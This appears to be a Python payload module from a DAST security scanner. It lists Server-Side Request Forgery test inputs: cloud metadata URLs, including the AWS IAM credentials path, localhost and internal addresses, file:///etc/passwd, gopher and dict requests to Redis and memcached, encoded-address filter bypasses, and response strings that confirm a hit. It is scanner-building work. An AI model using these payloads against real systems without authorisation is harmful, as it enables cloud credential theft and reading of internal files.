"""
DevSecure360 — DAST SSRF Payloads
====================================
Server-Side Request Forgery payload set.
Sources: OWASP Testing Guide WSTG-INPV-19, PayloadsAllTheThings SSRF corpus.
"""


def get_payloads(oob_host: str, canary_id: str) -> list:
    """
    SSRF payloads. Confirmed by OOB HTTP callback.
    oob_host: the host/IP of the OOB listener (e.g. 'oob.devsecure360.io' or '127.0.0.1:4444')
    """
    return [
        # OOB callback — primary confirmation method
        f"http://{oob_host}/{canary_id}",
        f"https://{oob_host}/{canary_id}",

        # AWS metadata (IMDS v1 — returns data if server runs on AWS)
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",

        # GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",

        # Azure metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

        # Localhost probing (internal service discovery)
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:8080/",
        "http://0.0.0.0/",

        # Internal RFC-1918 ranges
        "http://192.168.1.1/",
        "http://10.0.0.1/",

        # Protocol alternatives (often bypass URL scheme whitelists)
        f"dict://127.0.0.1:11211/stats",   # Redis/memcached
        f"file:///etc/passwd",             # File read via SSRF
        f"gopher://127.0.0.1:6379/",       # Redis gopher

        # URL bypass tricks
        f"http://127.1/{canary_id}",
        f"http://2130706433/{canary_id}",   # 127.0.0.1 in decimal
        f"http://0x7f000001/{canary_id}",   # 127.0.0.1 in hex
    ]


INTERNAL_ORACLE_STRINGS = [
    # AWS
    "ami-id", "instance-id", "security-credentials",
    # GCP
    "computeMetadata", "serviceAccounts",
    # Azure
    "subscriptionId", "vmId",
    # Generic internal service
    "Server: Apache", "Server: nginx", "X-Powered-By",
]
